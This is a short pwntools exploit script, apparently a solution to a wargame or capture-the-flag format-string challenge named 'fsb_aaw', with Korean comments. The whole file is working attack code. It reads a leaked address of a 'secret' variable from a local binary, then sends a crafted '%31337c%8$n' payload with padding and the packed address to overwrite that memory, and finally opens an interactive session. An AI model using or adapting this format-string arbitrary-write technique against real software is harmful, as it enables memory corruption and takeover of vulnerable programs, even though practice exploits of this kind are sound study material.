from pwn import *

p = process("./fsb_aaw")

secret = b''
p.recvuntil(": ")
secret += p.recvline()
secret = secret[:-1]
secret = int(secret, 16)

fstring = b''
# $8에 secret 주소 넣기
# %31337c%8$n + aaaaa + secret주소
fstring += b"%31337c%8$n"
fstring += b"\x00"*5
fstring += p64(secret)

#send
p.sendline(fstring)


p.interactive()